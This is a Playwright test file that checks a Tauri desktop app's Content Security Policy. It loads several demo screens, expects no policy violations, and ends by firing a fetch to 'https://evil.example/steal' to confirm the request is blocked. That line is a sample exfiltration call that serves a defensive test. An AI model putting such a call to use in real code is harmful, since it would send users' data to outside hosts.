import { expect, test } from '@playwright/test';
import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { mockApp } from './mockApp.mjs';

const tauriCsp = JSON.parse(
  readFileSync(new URL('../../src-tauri/tauri.conf.json', import.meta.url)),
).app.security.csp;

/** The desktop policy as Tauri serves it: build-time hashes of inline scripts, plus the test server's origin. */
const policyFor = (html, origin) => {
  const hashes = [
    ...html.matchAll(/<script(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script>/g),
  ].map(
    ([, body]) =>
      `'sha256-${createHash('sha256').update(body).digest('base64')}'`,
  );
  const extra = {
    'script-src': hashes,
    'connect-src': [origin, origin.replace(/^http/, 'ws')],
  };
  return Object.entries(tauriCsp)
    .map(([directive, value]) =>
      [
        directive,
        ...(Array.isArray(value) ? value : [value]),
        ...(extra[directive] ?? []),
      ].join(' '),
    )
    .join('; ');
};

test('the desktop CSP lets the main screens run and blocks foreign hosts', async ({
  page,
  baseURL,
}) => {
  expect(tauriCsp, 'app.security.csp in tauri.conf.json').toBeTruthy();
  await page.addInitScript(() => {
    window.__cspViolations = [];
    document.addEventListener('securitypolicyviolation', (event) =>
      window.__cspViolations.push(
        `${event.violatedDirective} ${event.blockedURI} ${event.sourceFile}`,
      ),
    );
  });
  await page.route(
    (url) =>
      url.origin === baseURL &&
      !url.pathname.includes('.') &&
      !url.pathname.startsWith('/api/') &&
      !url.pathname.startsWith('/@'),
    async (route) => {
      if (route.request().resourceType() !== 'document')
        return route.fallback();
      const response = await route.fetch();
      const html = await response.text();
      await route.fulfill({
        response,
        body: html,
        headers: {
          ...response.headers(),
          'content-security-policy': policyFor(html, baseURL),
        },
      });
    },
  );
  await mockApp(page, { blockTask: true });

  // vuedraggable's globalThis fallback tries `new Function` inside a try/catch; Plausible is blocked on desktop.
  const violations = async () =>
    (await page.evaluate(() => window.__cspViolations)).filter(
      (entry) =>
        !/^script-src eval .*vuedraggable/.test(entry) &&
        !/^script-src-elem https:\/\/[^/]+\/js\/script\.js /.test(entry),
    );
  for (const path of [
    '/demo/board',
    '/demo/list',
    '/demo/categories',
    '/settings/workspaces',
    '/demo/files',
  ]) {
    await page.goto(path);
    await page.waitForLoadState('networkidle');
    expect(await violations(), path).toEqual([]);
  }

  await page.goto('/demo/board');
  await page.getByText('Original task').first().click();
  await expect(page.getByText('Initial block').first()).toBeVisible();
  await page.waitForLoadState('networkidle');
  expect(await violations(), 'task panel').toEqual([]);

  await page.evaluate(() =>
    fetch('https://evil.example/steal').catch(() => null),
  );
  await expect
    .poll(violations)
    .toEqual([expect.stringMatching(/^connect-src https:\/\/evil\.example/)]);
});
